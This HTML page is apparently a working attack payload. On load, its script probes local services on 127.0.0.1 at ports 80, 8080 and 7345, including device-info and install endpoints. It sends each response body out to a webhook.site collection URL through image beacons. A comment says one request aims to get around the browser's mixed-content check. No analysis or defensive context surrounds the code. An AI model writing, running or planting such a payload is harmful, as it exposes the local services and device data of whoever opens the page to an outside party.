<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
</head>
<body>
<script>
const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';

function send(data) {
  const encoded = encodeURIComponent(JSON.stringify(data)).slice(0, 1800);
  new Image().src = EXFIL + '?d=' + encoded;
}

function xhrProbe(url) {
  return new Promise((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.timeout = 3000;
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4) {
        resolve({url, status: xhr.status, body: xhr.responseText.slice(0, 2000)});
      }
    };
    xhr.ontimeout = () => resolve({url, error: 'timeout'});
    xhr.onerror = () => resolve({url, error: 'error'});
    xhr.open('GET', url, true);
    xhr.send();
  });
}

async function main() {
  send({status: 'alive'});

  // Focus on the two reachable ports and variations
  const targets = [
    'http://127.0.0.1:80/',
    'http://127.0.0.1:80/index.html',
    'http://127.0.0.1:80/api',
    'http://127.0.0.1:80/info',
    'http://127.0.0.1:80/status',
    'http://127.0.0.1:80/version',
    'http://127.0.0.1:8080/',
    'http://127.0.0.1:8080/index.html',
    'http://127.0.0.1:8080/api',
    'http://127.0.0.1:8080/info',
    'http://127.0.0.1:8080/status',
    'http://127.0.0.1:8080/version',
    // Also retry 7345 via XHR - may bypass mixed content check
    'http://127.0.0.1:7345/state/device/deviceinfo',
    'http://127.0.0.1:7345/scpl/install',
  ];

  for (const url of targets) {
    const result = await xhrProbe(url);
    send(result);
    await new Promise(r => setTimeout(r, 400));
  }

  send({status: 'done'});
}

main();
</script>
</body>
</html>
